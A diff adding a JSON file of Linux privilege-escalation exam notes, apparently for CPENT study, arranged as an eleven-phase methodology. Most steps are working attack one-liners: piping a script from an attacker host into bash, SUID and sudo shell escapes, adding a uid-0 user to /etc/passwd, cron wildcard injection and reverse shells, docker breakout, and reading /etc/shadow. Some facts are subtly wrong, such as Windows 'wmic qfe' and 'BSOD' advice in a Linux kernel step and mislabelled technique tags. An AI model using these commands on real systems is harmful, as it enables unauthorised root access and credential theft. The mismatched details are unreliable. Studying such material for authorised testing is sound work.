@@ -1,0 +1,216 @@
+{
+  "id": "linux-privesc-argha-dey-methodology",
+  "zone": "privilege-escalation",
+  "name": "Argha Dey Linux Privilege Escalation Methodology",
+  "source": "Argha Dey CPENT Notes (94% scorer)",
+  "description": "Recommended Exam-Day Workflow: id && sudo -l && uname -a \u2192 LinPEAS \u2192 SUID/SGID \u2192 sudo rules \u2192 cron \u2192 kernel CVEs \u2192 password hunting \u2192 container breakout. Includes A-Z technique catalogue and kernel exploit catalogue (Dirty COW, Dirty Pipe, PwnKit, Baron Samedit, OverlayFS, Netfilter, PolicyKit, Dirty Sock).",
+  "examHabits": [
+    "Run LinPEAS and review high/red-flagged items first",
+    "Check SUID/SGID binaries with find / -perm -4000 -type f 2>/dev/null",
+    "Check capabilities with getcap -r / 2>/dev/null",
+    "Check sudo rules with sudo -l against GTFOBins",
+    "Check cron jobs with pspy (monitor without root)",
+    "Cross-check kernel/sudo/polkit version against known CVEs (Dirty Pipe, PwnKit, Baron Samedit)",
+    "Check for password/config file leftovers and reused SSH keys",
+    "If in docker/lxd group: container breakout via docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+    "Always verify kernel/software version and patch level first \u2014 kernel exploits can crash the target",
+    "Understand the manual compilation path, not just Metasploit \u2014 CPENT exam often doesn't provide Metasploit access"
+  ],
+  "quickRef": "id && sudo -l && uname -a \u2192 linpeas.sh \u2192 find / -perm -4000 \u2192 getcap -r / \u2192 cat /etc/crontab \u2192 searchsploit linux kernel <version>",
+  "steps": [
+    {
+      "phase": "Phase 1 - Enumeration (Always Start Here)",
+      "techniques": [],
+      "tools": [
+        "linpeas",
+        "linenum",
+        "lse"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Fresh foothold on Linux",
+          "action": "id; whoami; uname -a; cat /etc/os-release; cat /proc/version; sudo -l; cat /etc/passwd; cat /etc/group; groups",
+          "fallback": "If LinPEAS not available: ps aux; ss -tulpn; env; echo $PATH; history"
+        },
+        {
+          "condition": "Automated tools needed",
+          "action": "curl http://<attacker>/linpeas.sh | bash; review red-flagged items first",
+          "fallback": "Linux Exploit Suggester (les.sh) to narrow down CVEs by kernel/sudo version"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 2 - SUID / SGID Binary Abuse",
+      "techniques": [
+        "suid-abuse"
+      ],
+      "tools": [
+        "linpeas",
+        "find"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "SUID binaries found (find / -perm -4000)",
+          "action": "Check each against GTFOBins for known exploitation one-liners (e.g., find / -exec /bin/sh -p \\; -quit if find has SUID)",
+          "fallback": "Run binary with special args: nmap --interactive, vim -c '!bash', awk 'BEGIN {system(\"/bin/sh\")}'"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 3 - Sudo Misconfigurations",
+      "techniques": [
+        "sudo-misconfiguration"
+      ],
+      "tools": [
+        "sudo",
+        "linpeas"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "sudo -l shows NOPASSWD entries",
+          "action": "Check if binary can spawn shell: sudo vim -c ':!/bin/sh'; sudo less /etc/hosts then type !/bin/sh",
+          "fallback": "Wildcard injection: sudo /usr/bin/php* or path traversal in sudoers"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 4 - Cron Jobs",
+      "techniques": [
+        "cron-jobs"
+      ],
+      "tools": [
+        "pspy",
+        "linpeas"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Scripts run by root are world-writable",
+          "action": "Overwrite script with reverse shell payload; wait for cron to fire",
+          "fallback": "Wildcard injection in tar/rsync cron: echo '' > --checkpoint=1; echo '' > --checkpoint-action=exec=sh shell.sh"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 5 - Environment Variable / PATH Abuse",
+      "techniques": [
+        "suid-abuse",
+        "sudo-misconfiguration"
+      ],
+      "tools": [
+        "linpeas"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Root-executed script calls binary without absolute path",
+          "action": "PATH hijack: echo '/bin/bash' > /tmp/ls; chmod +x /tmp/ls; export PATH=/tmp:$PATH",
+          "fallback": "LD_PRELOAD: check sudo -l for env_keep+=LD_PRELOAD; craft malicious .so loading as root"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 6 - Capabilities & File Permission Weaknesses",
+      "techniques": [
+        "suid-abuse"
+      ],
+      "tools": [
+        "getcap",
+        "linpeas"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Binaries with dangerous capabilities found",
+          "action": "getcap -r / \u2192 find cap_setuid+ep on python/perl; exploit: /usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
+          "fallback": "Find writable /etc/passwd \u2192 append root user: openssl passwd -1 -salt abc password123; echo 'hacker:$1$abc$hash:0:0:root:/root:/bin/bash' >> /etc/passwd"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 7 - Password Hunting & SSH Key Reuse",
+      "techniques": [
+        "suid-abuse"
+      ],
+      "tools": [
+        "grep",
+        "find",
+        "linpeas"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Searching for hardcoded secrets",
+          "action": "grep -r 'password' /etc /var /opt 2>/dev/null; find / -name '*.bak' -o -name '*.old' -o -name '*config*' 2>/dev/null; cat ~/.bash_history; cat /var/log/*.log | grep -i pass",
+          "fallback": "find / -name authorized_keys 2>/dev/null; find / -name id_rsa 2>/dev/null \u2014 check for reused keys"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 8 - NFS no_root_squash",
+      "techniques": [
+        "suid-abuse"
+      ],
+      "tools": [
+        "showmount",
+        "linpeas"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "NFS share mounted with no_root_squash",
+          "action": "showmount -e <target>; mount NFS; create root-owned SUID binary on attacker, copy to share, it retains root privileges",
+          "fallback": "Check /etc/exports for share configuration"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 9 - Container Breakout (Docker/LXD group)",
+      "techniques": [
+        "suid-abuse"
+      ],
+      "tools": [
+        "docker",
+        "linpeas"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "User in docker group (id shows docker)",
+          "action": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+          "fallback": "LXD group: build privileged container image, mount host /"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 10 - Kernel Exploits (CVE Catalogue)",
+      "techniques": [],
+      "tools": [
+        "searchsploit",
+        "linux-exploit-suggester",
+        "msfconsole",
+        "gcc"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Kernel version confirmed via uname -a",
+          "action": "Cross-reference: CVE-2016-5195 (Dirty COW, <4.8.3); CVE-2022-0847 (Dirty Pipe, 5.8-5.16.10); CVE-2021-4034 (PwnKit/PKEXEC); CVE-2021-3156 (Baron Samedit/sudo); CVE-2021-3493 (OverlayFS); CVE-2022-25636 (Netfilter); CVE-2021-3560 (PolicyKit); CVE-2019-7304 (Dirty Sock/Snapd)",
+          "fallback": "Only attempt if OS is unpatched; document patch level match carefully first (wmic qfe) \u2014 kernel exploits can BSOD a box"
+        },
+        {
+          "condition": "Metasploit path preferred",
+          "action": "use post/multi/recon/local_exploit_suggester; set SESSION <id>; or use exploit/linux/local/* modules",
+          "fallback": "Manual: searchsploit <cve> \u2192 fetch PoC \u2192 compile \u2192 execute (gcc -pthread, make, etc.)"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 11 - Post-Exploitation Proof (after root achieved)",
+      "techniques": [],
+      "tools": [
+        "linpeas"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Root shell obtained",
+          "action": "cat /etc/shadow; hostname; id (confirm uid=0); find / -name flag.txt -o -name root.txt 2>/dev/null",
+          "fallback": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' for stable root shell"
+        }
+      ]
+    }
+  ]
+}
